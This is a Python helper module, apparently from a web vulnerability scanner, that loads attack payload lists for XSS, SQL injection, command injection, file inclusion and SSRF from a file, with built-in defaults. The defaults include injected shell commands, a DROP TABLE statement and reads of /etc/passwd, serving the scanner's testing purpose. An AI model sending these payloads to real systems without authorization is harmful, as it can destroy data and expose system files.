# src/utils/payloads.py
import json
import os
import logging

def load_payloads(payloads_file, test_localhost=False):
    default_payloads = {
        "XSS": ["<script>alert('xss')</script>", "';alert('xss');//", "<img src=x onerror=alert('xss')>", "javascript:alert(1)"],
        "SQLi": ["' OR 1=1 --", "1' UNION SELECT NULL, @@version --", "' DROP TABLE users; --", "' AND SLEEP(5) --"],
        "Command Injection": ["; ls", "&& dir", "| whoami", "; sleep 5"],
        "LFI": ["../../../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
        "RFI": ["http://example.com/malicious.php"],
        "SSRF": ["http://localhost", "file:///etc/hosts"]
    }
    
    # Charger depuis le fichier si disponible
    if os.path.exists(payloads_file):
        with open(payloads_file, 'r') as f:
            payloads = json.load(f)
    else:
        logging.info(f"Fichier {payloads_file} non trouvé, utilisation des payloads par défaut")
        payloads = default_payloads

    # Filtrer les payloads locaux si test_localhost est False
    if not test_localhost:
        for vuln_type in payloads:
            payloads[vuln_type] = [p for p in payloads[vuln_type] if "localhost" not in p and "file://" not in p]
    
    return payloads